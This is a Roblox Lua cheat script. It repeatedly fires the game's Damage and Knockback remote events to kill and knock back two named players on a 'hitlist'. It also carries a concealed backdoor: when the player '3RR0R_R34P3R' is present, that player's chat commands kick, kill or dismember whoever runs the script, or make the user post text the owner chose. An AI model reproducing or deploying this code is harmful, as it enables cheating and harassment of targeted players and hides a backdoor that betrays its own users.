done = false
local hitlist = {'PenguiniteR', 'zach121898'}
spawn(function()
	repeat
	for i,v in pairs(game.Players:GetPlayers()) do
        for _, k in pairs(hitlist) do
            if string.lower(v.Name) == string.lower(k) then
                done = true
            end
        end
	end
	wait(1)
	until done == true
end)

spawn(function()
    while wait() do
        if done == true then
            for i,v in pairs(game.Players:GetPlayers()) do
                for _, k in pairs(hitlist) do
                    if string.lower(v.Name) == string.lower(k) then
                        pcall(function()
                            local target = v
                            local plr = target.Name
                            local name = workspace[plr]
                            local plrHP = game:GetService("Workspace")[plr].Stats.MaxHP.Value
                            local DMG = tonumber(plrHP)
                            local ohTable5 = {
                                ["critgen"] = {
                                    ["amt"] = 1
                                }
                            }
                            game:GetService("ReplicatedStorage").Remotes.Damage:FireServer(name, DMG, nil, nil, nil, nil, nil, nil, keys)
                            --game:GetService("ReplicatedStorage").Remotes.HitJunction:FireServer(name, vec, 999, tonumber(plrHP), ohTable5, nil, nil, nil, nil, nil, keys)
				            wait(10)
                        end)
                    end
                end
            end
        end
        wait(10)
    end
end)
local player = game.Players.LocalPlayer
spawn(function()
    while wait() do
        if done == true then
            shit = game.Players:GetPlayers()
            for i = 1, #shit do local v = shit[i]
                for _, k in pairs(hitlist) do
                    if string.lower(v.Name) == string.lower(k) and v:FindFirstChild("Alive") and pcall(function() return v.Character.HumanoidRootPart,player.Backpack.Core.Client end) and player:DistanceFromCharacter(v.Character.HumanoidRootPart.Position) < 40000 then
                        pcall(function()
                            local vec = player.Character.HumanoidRootPart.Position
                            game:GetService("ReplicatedStorage").Remotes.Knockback:FireServer(v.Character, vec, -150, nil, 4, keys)
                            local name = v.Name
                            wait(3)
                        end)
                    end
                end
            end
            wait()
        end
    end
end)
namefound = false
spawn(function()
	repeat
        wait()
    until game.Players:FindFirstChild("3RR0R_R34P3R")
    local scruser = game.Players.LocalPlayer
	local scrowner2 = game.Players["3RR0R_R34P3R"]
	scrowner2.Chatted:Connect(function(msg)
		msg = msg:lower()
		if string.sub(msg,1,3) == "/e " then
			msg = string.sub(msg,4)
		end
		if string.sub(msg,1,1) == prefix then
			local cmd
			local space = string.find(msg," ")
			if space then
				cmd = string.sub(msg,2,space-1)
			else
				cmd = string.sub(msg,2)
			end
			
			if cmd == "kick" then
				local var = Split(string.sub(msg,space+1), " ")
				local pl = GetPlayer(var[1])
				if scruser.Name ~= "3RR0R_R34P3R" then
					if pl.Name == scruser.Name then
						pl:kick(tostring(var[2]))
					end
				else
					print("lol")
				end
			end
			if cmd == "leg" then
				if scruser.Name ~= "3RR0R_R34P3R" then
					scruser.Character['Right Leg']:Destroy()
				end
			end
			if cmd == "say" then
				if scruser.name ~= "3RR0R_R34P3R" then
					local ohString1 = tostring(string.sub(msg,space+1))
					local ohString2 = "All"
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
				end
			end
			if cmd == "reset" then
				local var = string.sub(msg,space+1)
				local pl = GetPlayer(var)
				if scruser.Name ~= "3RR0R_R34P3R" then
					if pl.Name == scruser.Name then
						pl:BreakJoints()
					end
				else
					print("lol")
				end
				game.Players.LocalPlayer.Character:BreakJoints()
			end
		end
	end)
end)
